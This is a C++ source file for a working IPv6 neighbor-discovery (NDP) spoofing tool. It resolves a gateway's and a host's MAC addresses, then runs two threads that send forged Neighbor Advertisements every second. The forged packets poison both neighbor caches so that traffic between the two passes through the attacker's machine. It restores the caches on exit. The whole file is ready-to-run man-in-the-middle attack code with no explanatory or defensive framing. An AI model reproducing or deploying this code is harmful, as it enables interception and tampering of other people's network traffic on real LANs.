#include <Utils.h>
#include <Packet.h>
#include <Filter.h>
#include <CLI.h>

#include <thread>
#include <atomic>

bool inet6_address_resolution(Interface& interface,uint8_t* tiaddr,uint8_t* thaddr,int attempts = 5);

sockaddr_ll get_sockaddr_ll(int ifindex,uint8_t *haddr){
    sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETHERNET_IPV6);
    addr.sll_ifindex = ifindex;
    addr.sll_halen = MAC_ADDRESS_LENGTH;
    memcpy(addr.sll_addr,haddr,addr.sll_halen);
    return addr;
}


int main(int n_args,char **args){
    Interface interface;
    if(!cli_read_interface(interface,n_args,args,"--interface","Interface Name: ")){
        return 1;
    }

    uint8_t gateway_haddr[MAC_ADDRESS_LENGTH] = {0};
    uint8_t gateway_iaddr[IPV6_ADDRESS_LENGTH] = {0};
    if(!cli_read_ipv6(gateway_iaddr,n_args,args,"--gateway","Gateway IP Address: ")){
        return 1;
    }
    while(true){
        if(!inet6_address_resolution(interface,gateway_iaddr,gateway_haddr)){
            printf("Address Resolution Failed\n");
            return 1;
        }

        break;
    }
    sockaddr_ll gateway_addr = get_sockaddr_ll(interface.index,gateway_haddr);


    uint8_t host_haddr[MAC_ADDRESS_LENGTH] = {0};
    uint8_t host_iaddr[IPV6_ADDRESS_LENGTH] = {0};
    if(!cli_read_ipv6(host_iaddr,n_args,args,"--host","Host IP Adddress: ")){
        return 1;
    }
    while(true){
        if(!inet6_address_resolution(interface,host_iaddr,host_haddr)){
            printf("Address Resolution Failed\n");
            return 1;
        }

        break;
    }
    sockaddr_ll host_addr = get_sockaddr_ll(interface.index,host_haddr);
    

    printf("\nInterface Name: %s ",interface.name.c_str());
    printf("IP: %s ",sprint_ipv6(interface.in6_addr));
    printf("MAC: %s\n",sprint_mac(interface.haddr));

    printf("\nGateway IP: %s ",sprint_ipv6(gateway_iaddr));
    printf("MAC: %s\n",sprint_mac(gateway_haddr));

    printf("\nHost IP: %s ",sprint_ipv6(host_iaddr));
    printf("MAC: %s\n",sprint_mac(host_haddr));


    int sock = socket(AF_PACKET,SOCK_DGRAM,0);
    if(sock == -1){
        printf("socket: %s\n",strerror(errno));
        return 1;
    }

    IPV6 ipv6;
    ICMPV6 icmpv6;

    uint8_t gateway_flags = ICMPV6::NA_FLAG::SOLICITED_FLAG | ICMPV6::NA_FLAG::OVERRIDE_FLAG;
    
    uint8_t host_flags = ICMPV6::NA_FLAG::ROUTER_FLAG | ICMPV6::NA_FLAG::SOLICITED_FLAG | ICMPV6::NA_FLAG::OVERRIDE_FLAG;


    icmpv6.write_neighbor_advertisement(host_iaddr,gateway_iaddr,gateway_flags,host_iaddr,interface.haddr);
    ipv6.write_hdr(icmpv6.length(),IPPROTOCOL_ICMPV6,255,host_iaddr,gateway_iaddr);

    PACKET gateway_bad_packet;
    gateway_bad_packet = ipv6;
    gateway_bad_packet += icmpv6;


    icmpv6.write_neighbor_advertisement(gateway_iaddr,host_iaddr,host_flags,gateway_iaddr,interface.haddr);
    ipv6.write_hdr(icmpv6.length(),IPPROTOCOL_ICMPV6,255,gateway_iaddr,host_iaddr);

    PACKET host_bad_packet;
    host_bad_packet = ipv6;
    host_bad_packet += icmpv6;


    auto ndp_spoofing = [](int sock,PACKET *packet,sockaddr_ll *addr,std::atomic_bool *runner){
        while(runner->load(std::memory_order_acquire)){
            if(sendto(sock,packet->data(),packet->length(),0,(sockaddr*)addr,sizeof(*addr)) == -1){
                printf("send failed: %s\n",strerror(errno));
            }
            sleep(1);
        }
    };

    std::atomic_bool runner(true);

    std::thread gateway_na_thread(ndp_spoofing,sock,&gateway_bad_packet,&gateway_addr,&runner);
    std::thread host_na_thread(ndp_spoofing,sock,&host_bad_packet,&host_addr,&runner);

    printf("\nPrescione qualquer tecla para sair\n");
    clear_stdin();
    (void)getchar();

    runner.store(false,std::memory_order_release);

    if(gateway_na_thread.joinable()){
        gateway_na_thread.join();
    }
    if(host_na_thread.joinable()){
        host_na_thread.join();
    }


    icmpv6.write_neighbor_advertisement(host_iaddr,gateway_iaddr,gateway_flags,host_iaddr,host_haddr);
    ipv6.write_hdr(icmpv6.length(),IPPROTOCOL_ICMPV6,255,host_iaddr,gateway_iaddr);

    PACKET gateway_good_packet;
    gateway_good_packet = ipv6;
    gateway_good_packet += icmpv6;


    if(sendto(sock,gateway_good_packet.data(),gateway_good_packet.length(),0,(sockaddr*)&gateway_addr,sizeof(gateway_addr)) == -1){
        printf("sendto: %s\n",strerror(errno));
    }


    icmpv6.write_neighbor_advertisement(gateway_iaddr,host_iaddr,host_flags,gateway_iaddr,gateway_haddr);
    ipv6.write_hdr(icmpv6.length(),IPPROTOCOL_ICMPV6,255,gateway_iaddr,host_iaddr);

    PACKET host_good_packet;
    host_good_packet = ipv6;
    host_good_packet += icmpv6;


    if(sendto(sock,host_good_packet.data(),host_good_packet.length(),0,(sockaddr*)&host_addr,sizeof(host_addr)) == -1){
        printf("sendto: %s\n",strerror(errno));
    }

    close(sock);
    return 0;
}

bool inet6_address_resolution(Interface& interface,uint8_t* tiaddr,uint8_t* thaddr,int attempts){
    
    int sock = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_IPV6));
    if(sock == -1){
        printf("function: %s line: %d socket: %s\n",__func__,__LINE__,strerror(errno));
        return false;
    }

    sockaddr_ll saddr = {0};
    saddr.sll_family = AF_PACKET;
    saddr.sll_ifindex = interface.index;
    if(bind(sock,(sockaddr*)&saddr,sizeof(saddr)) == -1){
        printf("function: %s line: %d bind: %s\n",__func__,__LINE__,strerror(errno));
        close(sock);
        return false;
    }

    timeval tv;
    tv.tv_sec = 1e+0;
    tv.tv_usec = 0e+0;
    if(setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv)) == -1){
        printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
        close(sock);
        return false;
    }

    sock_filter filter[] = {
        {BPF_LD  | BPF_B   | BPF_ABS,0,0,IPV6_NEXT_HDR_OFFSET},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,19,IPPROTOCOL_ICMPV6},

        {BPF_LD  | BPF_B   | BPF_ABS,0,0,IPV6_HOP_LIMIT_OFFSET},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,17,255},

        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_SRC_ADDR_OFFSET + 0},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,15,READW(tiaddr + 0)},
        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_SRC_ADDR_OFFSET + 4},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,13,READW(tiaddr + 4)},
        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_SRC_ADDR_OFFSET + 8},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,11,READW(tiaddr + 8)},
        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_SRC_ADDR_OFFSET + 12},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,9,READW(tiaddr + 12)},

        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_DST_ADDR_OFFSET + 0},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,7,READW(interface.in6_addr + 0)},
        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_DST_ADDR_OFFSET + 4},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,5,READW(interface.in6_addr + 4)},
        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_DST_ADDR_OFFSET + 8},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,3,READW(interface.in6_addr + 8)},
        {BPF_LD  | BPF_W   | BPF_ABS,0,0,IPV6_DST_ADDR_OFFSET + 12},
        {BPF_JMP | BPF_JEQ | BPF_IMM,0,1,READW(interface.in6_addr + 12)},

        {BPF_RET | BPF_IMM,0,0,(uint32_t)-1},
        {BPF_RET | BPF_IMM,0,0,0}
    };

    sock_fprog fprog = {sizeof(filter) / sizeof(filter[0]),filter};

    if(setsockopt(sock,SOL_SOCKET,SO_ATTACH_FILTER,&fprog,sizeof(fprog)) == -1){
        printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
        close(sock);
        return false;   
    }

    uint8_t snm[IPV6_ADDRESS_LENGTH] = {0};
    snm[0] = 0xff;
    snm[1] = 0x02;
    snm[11] = 0x01;
    snm[12] = 0xff;
    snm[13] = tiaddr[13];
    snm[14] = tiaddr[14];
    snm[15] = tiaddr[15];

    uint8_t multicast_haddr[MAC_ADDRESS_LENGTH] = {0x33,0x33,0xff,tiaddr[13],tiaddr[14],tiaddr[15]};

    sockaddr_ll daddr = get_sockaddr_ll(interface.index,multicast_haddr);


    ICMPV6 s_icmp6;
    s_icmp6.write_neighbor_solicitation(interface.in6_addr,snm,tiaddr,interface.haddr);

    IPV6 s_ip6;
    s_ip6.write_hdr(s_icmp6.length(),IPPROTOCOL_ICMPV6,255,interface.in6_addr,snm);

    PACKET s_packet;
    s_packet = s_ip6;
    s_packet += s_icmp6;

    PACKET r_packet;

    for(int i = 0; i < attempts; ++i){
        
        if(sendto(sock,s_packet.data(),s_packet.length(),0,(sockaddr*)&daddr,sizeof(daddr)) == -1){
            printf("function: %s line: %d sendto: %s\n",__func__,__LINE__,strerror(errno));
            continue;
        }

        while(true){
            int l = recv(sock,r_packet.data(),r_packet.capacity(),0);

            if(l <= 0) break;

            r_packet.set_length(l);
            r_packet.unpack_ipv6_void();
            
            ICMPV6 icmp6 = r_packet.unpack<ICMPV6>();

            if(icmp6.type() != ICMPV6::TYPE::NEIGHBOR_ADVERTISEMENT) continue;

            ICMPV6::NA_HDR na_hdr = icmp6.read_na_hdr();

            if(memcmp(na_hdr.taddr,tiaddr,sizeof(na_hdr.taddr))) continue;

            for(ICMPV6::NDP_OPTION* option = icmp6.peek_ndp_option(); icmp6.ndp_option_ok(option); option = icmp6.advance_ndp_option(option)){
                
                if(option->type != ICMPV6::NDP_OPTION_TYPE::TARGET_LINKLAYER_ADDRESS) continue;

                icmp6.read(thaddr,MAC_ADDRESS_LENGTH,icmp6.ndp_option_data_offset());
                close(sock);

                return true;
            }
        }
    }

    close(sock);
    return false;
}
